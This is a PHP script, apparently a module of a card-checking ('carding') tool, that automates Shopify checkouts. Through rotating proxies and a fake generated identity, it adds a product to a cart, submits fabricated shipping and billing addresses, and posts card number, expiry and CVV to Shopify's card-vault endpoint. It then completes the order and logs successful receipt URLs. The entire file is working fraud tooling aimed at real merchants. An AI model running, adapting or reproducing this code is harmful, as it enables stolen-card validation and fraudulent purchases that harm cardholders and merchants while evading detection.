<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

if (!isset($extra) || empty($extra)) {
	$empty = 'Extra is Empty';

	goto start;
}

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$a = $this->curlx->Get('https://'.$extra->domain.'/cart/'.$extra->prod_id.':1?traffic_source=buy_now', null, $cookie, $server['proxy']);

if (!$a->success) goto start;

if (strpos($a->body, 'Out of stock')) {
	$empty = "Item is Out of Stock";

	goto start;
}

if (strpos($a->body, 'Access denied.')) {
	$empty = "Access Denied";

	goto start;
}

if (strpos($a->url, 'account/login')) {
	$empty = "Login is Required for Making Purchases";

	goto start;
}

if (strpos($a->url, '/checkouts/c/')) {
	$empty = "Site is Using Another Checkout Version";

	goto start;
}

if (empty($checkout_url = str_replace('?traffic_source=buy_now', '', $a->url))) {
	$empty = "Checkout Url Can't Be Empty";

	goto start;
}

if (empty($auth = trim(strip_tags($this->getstr($a->body, 'input type="hidden" name="authenticity_token" value="', '"'))))) {
	$empty = "Auth Token is Empty";

	goto start;
}

if (empty($next_step = trim(strip_tags($this->getstr($a->body, 'hidden" name="step" value="', '"'))))) {
	$empty = "Step is Empty";

	goto start;
}

if ($next_step == 'shipping_method') {
	$data = [
		'_method' => 'patch',
		'authenticity_token' => $auth,
		'previous_step' => 'contact_information',
		'step' => 'shipping_method',
		'checkout[email]' => $fake->email,
		'checkout[buyer_accepts_marketing]' => '0',
		'checkout[shipping_address][first_name]' => $fake->first,
		'checkout[shipping_address][last_name]' => $fake->last,
		'checkout[shipping_address][company]' => '',
		'checkout[shipping_address][address1]' => '12 Main Street',
		'checkout[shipping_address][address2]' => '',
		'checkout[shipping_address][city]' => 'Brewster',
		'checkout[shipping_address][country]' => 'United States',
		'checkout[shipping_address][province]' => 'NY',
		'checkout[shipping_address][zip]' => '10509',
		'checkout[shipping_address][phone]' => '2563452745',
		'checkout[remember_me]' => '0',
		'checkout[client_details][browser_width]' => '412',
		'checkout[client_details][browser_height]' => '718',
		'checkout[client_details][javascript_enabled]' => '1',
		'checkout[client_details][color_depth]' => '24',
		'checkout[client_details][java_enabled]' => 'false',
		'checkout[client_details][browser_tz]: 300'
	];

	if (isset($extra->custom)) {
		foreach ($extra as $key => $value) {
			$keys = [
				'cus_company' => 'checkout[shipping_address][company]',
				'cus_str' => 'checkout[shipping_address][address1]',
				'cus_str_2' => 'checkout[shipping_address][address2]',
				'cus_city' => 'checkout[shipping_address][city]',
				'cus_country' => 'checkout[shipping_address][country]',
				'cus_state' => 'checkout[shipping_address][province]',
				'cus_zip' => 'checkout[shipping_address][zip]'
			];

			if (isset($keys[$key])) $data[$keys[$key]] = $value;
		}
	}

	$b = $this->curlx->Post($checkout_url, http_build_query($data), null, $cookie, $server['proxy']);

	if (!$b->success) goto start;

	$ship_url = preg_match('/"\/\/cdn.shopify.com(.*?)files(.*?)t(.*?)assets(.*?)checkout\.js\?v=(.*?)"/', $b->body, $match) ? 'https:'.str_replace('"', '', $match[0]) : null;

	if (!strpos($b->body, '<div class="radio-wrapper" data-shipping-method="')) {
		$b = $this->curlx->Get($checkout_url.'?step=shipping_method', null, $cookie, $server['proxy']);

		if (!$b->success) goto start;

		if (!strpos($b->body, '<div class="radio-wrapper" data-shipping-method="')) {
			$b = $this->curlx->Get($checkout_url.'/shipping_rates?step=shipping_method', null, $cookie, $server['proxy']);

			if (!$b->success) goto start;

			if (!strpos($b->body, '<div class="radio-wrapper" data-shipping-method="') && $ship_url) {
				$b = $this->curlx->Get($ship_url, null, $cookie, $server['proxy']);

				if (!$b->success) goto start;
			}
		}
	}

	$err = empty($tmp = trim(strip_tags($this->getstr($b->body, 'class="notice__content"><p class="notice__text">', '<')))) ? trim(strip_tags($this->getstr($this->getstr($b->body, 'field__message field__message--error', '/'), '>', '<'))) : $tmp;

	if (!empty($err)) {
		$empty = $err;

		goto start;
	}

	$ship_id = empty($tmp = trim(strip_tags($this->getstr($b->body, '<div class="radio-wrapper" data-shipping-method="', '"')))) ? trim(strip_tags($this->getstr($b->body, 'radio-wrapper[data-shipping-method="', '"'))) : $tmp;

	if (empty($ship_id)) {
		$empty = "Shipping Method is Empty";

		goto start;
	}

	$enc_ship_id = str_replace('amp%3B', '', urlencode($ship_id));

	$data = '_method=patch&authenticity_token='.urlencode($auth).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D='.$enc_ship_id.'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=412&checkout%5Bclient_details%5D%5Bbrowser_height%5D=718&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240';
} elseif ($next_step == 'payment_method') {
	$data = '_method=patch&authenticity_token='.urlencode($auth).'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D='.urlencode($fake->email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D='.$fake->first.'&checkout%5Bbilling_address%5D%5Blast_name%5D='.$fake->last.'&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=12+Main+Street&checkout%5Bbilling_address%5D%5Baddress2%5D='.($extra->cus_str_2 ?? '').'&checkout%5Bbilling_address%5D%5Bcity%5D=Brewster&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10509&checkout%5Bbilling_address%5D%5Bphone%5D=%28920%29+231-3473&checkout%5Bclient_details%5D%5Bbrowser_width%5D=412&checkout%5Bclient_details%5D%5Bbrowser_height%5D=718&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240';
} else {
	$empty = "Unknown Step Found, Kindly Contact Support to Determine The New Step";

	goto start;
}

$c = $this->curlx->Post($checkout_url, $data, null, $cookie, $server['proxy']);

if (!$c->success) goto start;

if (!strpos($c->body, 'gateway="')) {
	$c = $this->curlx->Get($checkout_url.'?previous_step='.$next_step.'&step=payment_method', null, $cookie, $server['proxy']);

	if (!$c->success) goto start;
}

if (empty($gateway = $this->getstr($c->body, 'gateway="', '"'))) {
	$empty = "Payment Gateway is Empty";

	goto start;
}

if (empty($price = $this->getstr($c->body, 'payment-due-target="', '"'))) {
	$empty = "Item Price is Empty";

	goto start;
}

$data = '{"credit_card":{"number":"'.$cc.'","name":"'.$fake->first.' '.$fake->last.'","month":'.$m.',"year":'.$yyyy.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$extra->domain.'"}';

$headers = [
	'content-type: application/json'
];

$d = $this->curlx->Post('https://deposit.us.shopifycs.com/sessions', $data, $headers, $cookie, $server['proxy']);

if (!$d->success) goto start;

if (empty($ses_id = trim(strip_tags($this->getstr($d->body, '"id":"', '"'))))) {
	$empty = "Shopify ID is Empty";

	goto start;
}

if (strpos($c->body, 'billing_address')) {
	$data = '_method=patch&authenticity_token='.urlencode($auth).'&previous_step=payment_method&step=&s='.$ses_id.'&checkout%5Bpayment_gateway%5D='.$gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D='.$fake->first.'&checkout%5Bbilling_address%5D%5Blast_name%5D='.$fake->last.'&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=12+Main+Street&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=Brewster&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10509&checkout%5Bbilling_address%5D%5Bphone%5D=%28256%29+358-6423&checkout%5Btotal_price%5D='.$price.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=412&checkout%5Bclient_details%5D%5Bbrowser_height%5D=718&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240';
} else {
	$data = '_method=patch&authenticity_token='.urlencode($auth).'&previous_step=payment_method&step=&s='.$ses_id.'&checkout%5Bpayment_gateway%5D='.$gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D='.$price.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=412&checkout%5Bclient_details%5D%5Bbrowser_height%5D=718&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300';
}

if (strpos($c->body, 'Same as shipping address')) $data .= '&checkout%5Bdifferent_billing_address%5D=false';

$e = $this->curlx->Post($checkout_url, $data, null, $cookie, $server['proxy']);

if (!$e->success) goto start;

$f = $this->curlx->Get($checkout_url.'/processing?from_processing_page=1', null, $cookie, $server['proxy']);

if (!$f->success) goto start;

while (!strpos($f->url, 'validate=true') && !strpos($f->url, 'thank_you') && $retry++ < 3) {
	sleep(1);

	$f = $this->curlx->Get($checkout_url.'?from_processing_page=1&validate=true', null, $cookie, $server['proxy']);

	if (!$f->success) goto start;
}

if (strpos($f->url, 'thank_you') !== false) file_put_contents('receipts.txt', $f->url . PHP_EOL, FILE_APPEND);

$err = trim(strip_tags($this->getstr($f->body, 'class="notice__content"><p class="notice__text">', '<')));

$status = $this->response->Shopify($f->body,  $err);

end: